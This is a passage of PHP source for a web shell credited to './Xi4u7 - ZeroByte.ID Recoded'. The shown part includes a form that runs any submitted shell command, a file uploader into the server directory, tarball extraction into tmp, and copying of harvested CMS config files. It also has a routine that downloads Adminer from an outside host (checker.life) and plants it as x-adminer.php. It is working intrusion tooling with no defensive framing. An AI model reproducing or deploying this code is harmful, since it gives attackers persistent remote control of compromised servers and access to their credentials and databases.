			echo '<a href="?path='.$cok.'/Xi4u7_Config">Done! Click Here</a>';
		}
		else {
			echo 'FAILED!!';
		}
	}
	else {
		mkdir($cok.'/Xi4u7_Config');
		echo '<form method="post" action="">';
		echo '<input name="dancok" type="text" placeholder="user-cms.txt">';
		echo '<input name="pindahx" type="submit" value="MOVE">';
		echo '</form>';
		if(!empty($_POST['pindahx'])) {
			exect('cat '.$_GET['cfg'].' > '.$cok.'/Xi4u7_Config/'.$_POST['dancok']);
			echo '<a href="?path='.$cok.'/Xi4u7_Config">Done! Click Here</a>';
		}
		else {
			echo 'FAILED!!';
	}
}
}

### EXTRACTOR TO TMP ###
else if($_GET['ext'] == 'extract2tmp')
{
	if (file_exists($_SERVER["DOCUMENT_ROOT"].'/tmp/') && is_writable($_SERVER["DOCUMENT_ROOT"].'/tmp/')) {
    	$tmppath = $_SERVER["DOCUMENT_ROOT"].'/tmp/';
	}
	else if(file_exists(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/') && is_writable(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/')) {
		$tmppath = dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/';
	}
	else if(file_exists('/tmp/') && is_writable('/tmp/')) {
		$tmppath = '/tmp/';
	}
	else {
		$tmppath = '';
	}

	if(!empty($tmppath)) {
		$gzfile = $_GET['gzname'];
		echo '[FILE] '.$gzfile.'<br>';
		echo '-- extract to --<br>';
		echo '[TMP] '.$tmppath.'<br>';
		$bsname = basename($gzfile);
		$gzrname = explode(".", $bsname);
		echo '<form method="post" action="">';
		echo '<input name="extract" type="submit" value="EXTRACT">';
		echo '</form>';
			if(!empty($_POST['extract'])) {
				exect('mkdir '.$tmppath.$gzrname[0]);
				$destdir = $tmppath.$gzrname[0];
				if (file_exists($destdir) && is_writable($destdir)) {
					echo "\n".'[EXTRACTED] <a href="?path='.$destdir.'">'.$destdir.'</a>'."\n";
					exect('tar -xzvf '.$gzfile.' -C '.$destdir);
				}
				else
				{
					echo 'FAILED!';
				}
			}
	}
	else {
		echo 'CANNOT EXTRACT TO TMP!';
	}

} 
### EXTRACTOR TO TMP - EOF ###

### CMD ###
else if($_GET['ext'] == 'shellcmd')
{
	echo '<h2>.::[ Shell Command ]::.</h2>';
	chdir($offdir);
	echo '<form method="post" action="">';
	echo 'terminal:~$ <input name="cmd" type="text" placeholder="echo AndroSec1337" style="width:300px"/>';
	echo ' <input type="submit" value=">>"/>';
	echo '</form>';
	if(!empty($_POST['cmd'])) {
		echo '<textarea style="width:100%;height:150px;" readonly>';
			$cmd = $_POST['cmd'];
			echo exect($cmd);
		echo '</textarea>';
	}
}
### CMD EOF ###

### UPLOADER ###
else if($_GET['ext'] == 'uploader')
{
	echo '<h2>.::[ Uploader ]::.</h2>';
	echo '<center>';
	echo '<form method=post enctype=multipart/form-data>';
	echo '<br><br>PATH ['.$offdir.']<br>';
	echo '<input type="file" name="zerofile"><input name="postupl" type="submit" value="Upload"><br>';
	echo '</form>';
	if($_POST["postupl"] == 'Upload')
	{
		if(@copy($_FILES["zerofile"]["tmp_name"],"$offdir/".$_FILES["zerofile"]["name"]))
			{ echo '<b>OK! '."$offdir/".$_FILES["zerofile"]["name"].'</b>'; }
		else 
			{ echo '<b>Upload Failed.</b>'; }
	}
	echo '</center>';
}
### UPLOADER EOF ###

### MYSQL INTERFACE ###
else if($_GET['ext'] == 'sql_interface')
{
	echo '<h2>.::[ MySQL Interface ]::.</h2>';
	echo '<center>';
	$dwadminer = 'http://checker.life/adminer.txt';
	$fileadminer = 'x-adminer.php';
	function call_adminer($dwadminer, $fileadminer) {
		$fp = fopen($fileadminer, "w+");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $dwadminer);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	file_put_contents($dwadminer, $fileadminer);
	}
	echo '<form method=post enctype=multipart/form-data>';
	echo '<input name="mysql_int" type="submit" value="Call Adminer 4.3.1"><br>';
	echo '</form>';
	if($_POST['mysql_int'] == 'Call Adminer 4.3.1') {
	    call_adminer($dwadminer, $fileadminer);
	    $linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	    if(file_exists('x-adminer.php')) {
	    	echo '<a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileadminer.'" target="_blank">Adminer OK!</a>';
	    }
	    else {
	    	echo '<font color="red">[FAILED]</a>';
	    } 

	}
	echo '</center>';
}
### MYSQL INTERFACE EOF ###


### FOOTER ###
echo '<div class="footer">';
echo '&copy; 2018 <a href="https://xi4u7.net/" rel="nofollow" target="_blank">./Xi4u7</a> - ZeroByte.ID Recoded';
echo '</div>';
echo '</div>';
 ?>
